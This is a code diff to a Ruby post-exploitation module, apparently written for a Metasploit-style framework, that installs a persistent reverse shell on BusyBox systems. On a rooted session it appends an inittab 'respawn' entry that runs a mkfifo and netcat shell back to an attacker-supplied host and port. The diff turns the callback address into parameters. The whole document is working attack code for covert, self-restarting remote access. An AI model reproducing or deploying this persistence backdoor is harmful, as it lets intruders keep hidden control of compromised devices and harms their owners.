@@ -1,5 +1,5 @@
 module BusyboxInittabReverseShell
-  def self.run(fm, sid, client)
+  def self.run(fm, sid, client,lhost,lport)
     session = fm.sessions[sid]
     return unless session
 
@@ -19,9 +19,6 @@ module BusyboxInittabReverseShell
 
     client.print_good("Session #{sid} is root. Deploying reverse shell via inittab...")
 
-    attacker_ip   = session.shell_command_token("ip route get 1 | awk '{print $7; exit}' 2>/dev/null || hostname -I | awk '{print $1}'").strip
-    attacker_port = 4444
-
     # Verificar se já foi injetado
     if session.shell_command_token("grep -q '#{marker}' #{inittab} 2>/dev/null && echo 'EXISTS'").include?('EXISTS')
       client.print_status("inittab reverse shell already deployed. Skipping.")
@@ -30,7 +27,7 @@ module BusyboxInittabReverseShell
 
     # Payload seguro: não bloqueia TTY, roda em background via respawn
     # Usa 'setsid' se disponível, senão executa diretamente com redirecionamento
-    payload_cmd = "rm -f /tmp/.b; mkfifo /tmp/.b; /bin/sh -i < /tmp/.b 2>&1 | nc #{attacker_ip} #{attacker_port} > /tmp/.b"
+    payload_cmd = "rm -f /tmp/.b; mkfifo /tmp/.b; /bin/sh -i < /tmp/.b 2>&1 | nc #{lhost} #{lport} > /tmp/.b"
 
     # Entrada no inittab: 'rs' = ID curto, '12345' = runlevels (todos), 'respawn' = reinicia se morrer
     inittab_entry = "rs:12345:respawn:#{payload_cmd} #{marker}"
